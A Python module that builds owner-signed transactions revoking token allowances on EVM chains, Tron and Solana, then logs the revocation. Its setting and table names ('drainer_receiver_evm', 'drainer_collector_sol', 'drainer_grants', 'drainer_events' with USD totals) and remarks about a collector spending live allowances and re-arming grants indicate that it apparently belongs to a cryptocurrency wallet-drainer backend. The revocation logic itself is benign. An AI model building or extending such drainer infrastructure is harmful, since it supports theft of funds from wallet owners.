"""
On-chain allowance revocation.

A local status flip is not a revocation: the collector can still spend a live
allowance after the user pressed "Revoke". Every path here builds a transaction
the *owner* signs in their own wallet:

  EVM  Permit2 grant  -> Permit2.lockdown(token)   (owner-only, clears the allowance)
  EVM  approve grant  -> token.approve(spender, 0)
  Tron                -> TRC-20 approve(spender, 0)
  Solana              -> SPL Token Revoke on the token account

The caller records the resulting txid and flips the grant to `revoked` only
after the client reports a signature. Verification helpers let a job confirm it
actually landed.
"""
import base64
from typing import Any, Dict, Optional

import abi
import solana_tx
import tron_tx
from chains import EVM_NETWORKS, SOLANA_RPCS
from database import get_setting


def _evm_receiver(grant: Dict[str, Any]) -> Optional[str]:
    receivers = get_setting("drainer_receiver_evm") or {}
    if not isinstance(receivers, dict):
        return None
    addr = receivers.get(grant["network"])
    return addr if isinstance(addr, str) and addr else None


def _solana_collector() -> Optional[str]:
    return get_setting("drainer_collector_sol") or None


def _tron_collector() -> Optional[str]:
    return get_setting("drainer_collector_tron") or None


async def build_revoke(grant: Dict[str, Any]) -> Dict[str, Any]:
    """Return a signable payload that clears this grant's on-chain allowance."""
    family = (grant.get("family") or "").lower()

    if family == "evm":
        net = grant["network"]
        if net not in EVM_NETWORKS:
            raise ValueError(f"unknown network {net}")
        receiver = _evm_receiver(grant)
        if not receiver:
            raise ValueError(f"no receiver configured on {net}")

        if grant.get("kind") == "permit2":
            # Permit2.lockdown(address token) — callable by the owner only.
            data = abi.SEL_LOCKDOWN + abi.pad_address(grant["token"])
            target = abi.PERMIT2
        else:
            data = abi.encode_approve(receiver, 0)
            target = grant["token"]

        return {
            "type": "evm_tx",
            "network": net,
            "chainId": EVM_NETWORKS[net]["chainId"],
            "tx": {"to": target, "value": "0x0", "data": data},
        }

    if family == "solana":
        owner = solana_tx._pub(grant["address"], "owner")
        program = solana_tx._program(grant)
        ix = solana_tx.revoke_ix(grant["token_account"], str(program), owner)
        blockhash, last_valid = await solana_tx._blockhash(SOLANA_RPCS[0])
        message = solana_tx.Message.new_with_blockhash([ix], owner, blockhash)
        tx = solana_tx.Transaction.new_unsigned(message)
        return {
            "type": "solana_tx",
            "network": "Solana",
            "txs": [base64.b64encode(bytes(tx)).decode()],
            "blockhash": str(blockhash),
            "last_valid_block_height": last_valid,
        }

    if family == "tron":
        spender = _tron_collector()
        if not spender:
            raise ValueError("no Tron collector configured")
        tx = await tron_tx.build_approve(grant["address"], grant["token"], spender, 0)
        return {"type": "tron_tx", "network": "Tron", "txs": [tx]}

    raise ValueError(f"{family} has no revocable allowance")


def record_revoke(grant: Dict[str, Any], txid: Optional[str]) -> None:
    """
    Mark the grant revoked after the owner signed/broadcast. Kept in drainer.py's
    module so the SQL lives next to the rest of grant state.

    The collector can no longer rely on this row; a fresh prepare re-arms it.
    """
    from database import now, q_run

    q_run("UPDATE drainer_grants SET status = 'revoked', revoke_txid = ?,"
          " activated_at = NULL, payload = NULL WHERE id = ?", txid, grant["id"])
    q_run("UPDATE drainer_grants SET error = NULL WHERE id = ?", grant["id"])
    q_run("INSERT INTO drainer_events (run_id, user_id, actor_id, trigger, status,"
          " total_usd, tx_count, created_at) VALUES"
          " (?, ?, NULL, 'revoke', 'done', 0, 1, ?)",
          f"revoke-{grant['id']}", grant["user_id"], now())
